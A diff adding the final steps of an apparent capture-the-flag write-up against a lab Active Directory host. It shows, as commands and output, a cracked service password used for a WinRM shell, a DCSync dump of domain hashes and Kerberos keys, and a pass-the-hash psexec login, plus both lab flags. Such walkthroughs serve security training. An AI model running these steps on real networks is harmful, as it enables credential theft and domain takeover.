@@ -304,9 +304,144 @@ Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
 1g 0:00:00:07 DONE (2021-01-08 14:10) 0.1410g/s 1495Kp/s 1495Kc/s 1495KC/s Sherbear94..Sheepy04
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
+```
+
+Now that I know the password for account svc_bes is password Sheffield19 I can use that account info with evil-winrm tool as the server is running the WinRM Windows remote management service
+
+```yaml
+## Install ##
+┌──(kali㉿kali)-[~]
+└─$ sudo gem install evil-winrm                                1 ⨯
+[sudo] password for kali: 
+Fetching evil-winrm-2.3.gem
+Happy hacking! :)
+Successfully installed evil-winrm-2.3
+Parsing documentation for evil-winrm-2.3
+Installing ri documentation for evil-winrm-2.3
+Done installing documentation for evil-winrm after 0 seconds
+1 gem installed
+                                                                   
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm                 
+
+Evil-WinRM shell v2.3
 
 
+## Execute ##
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19        1 ⨯
 
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_bes\Documents> 
+
+```
+
+### Grab the Flag ###
+
+```yaml
+*Evil-WinRM* PS C:\Users\svc_bes> cd Desktop
+*Evil-WinRM* PS C:\Users\svc_bes\Desktop> dir
+
+
+    Directory: C:\Users\svc_bes\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/25/2020   2:35 PM             32 user.txt
+
+
+*Evil-WinRM* PS C:\Users\svc_bes\Desktop> more user.txt
+b05fb166688a8603d970c6d033f637f1
+
+```
+
+At this point with the domain and the level of access we get with svc-bes we can dump all the secrets with a DCSync attacks launched with secretsdump.py
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+Impacket v0.9.23.dev1+20210108.113210.1dec03a4 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
+svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
+sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:ef1c506317dba8b0c856f29116fbc1b5:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
+Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
+Administrator:des-cbc-md5:f1c89e75a42cd0fb
+krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
+krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
+krbtgt:des-cbc-md5:d0f8d0c86ee9d997
+svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
+svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
+svc_bes:des-cbc-md5:1cc16e37ef8940b5
+sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
+sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
+sandra:des-cbc-md5:23988f7a9d679d37
+PATHFINDER$:aes256-cts-hmac-sha1-96:98a7cd4f2d34cd0a12d40a93265810d2a42f3a95268f571443a1fa63fb8ca24d
+PATHFINDER$:aes128-cts-hmac-sha1-96:8e684752257a95f7a279f857be299b84
+PATHFINDER$:des-cbc-md5:c779c48c20d394ad
+[*] Cleaning up... 
+```
+
+Two things I can try now 
+
+1. copy the domain secrets into a file and try cracking then with John then use those (not much luch different solution)
+
+2. Use the Administrator hash in a pass the hash PTH attack using:
+
+```yaml
+psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```   
+
+
+### Fini ###
+
+```yaml
+┌──(kali㉿kali)-[~]
+└─$ psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+Impacket v0.9.23.dev1+20210108.113210.1dec03a4 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.30.....
+[*] Found writable share ADMIN$
+[*] Uploading file sgrECEoD.exe
+[*] Opening SVCManager on 10.10.10.30.....
+[*] Creating service LeYQ on 10.10.10.30.....
+[*] Starting service LeYQ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\users\administrator\desktop
+ 
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is BEDE-E51D
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/25/2020  02:33 PM    <DIR>          .
+02/25/2020  02:33 PM    <DIR>          ..
+02/25/2020  02:33 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  13,184,819,200 bytes free
+
+C:\Users\Administrator\Desktop>more root.txt
+ee613b2d048303e5fd4ac6647d944645
+
+C:\Users\Administrator\Desktop>
+```
 
 [AD-Recon]: https://exploit.ph/active-directory-recon-1.html
 [blood-info]: https://github.com/BloodHoundAD/BloodHound
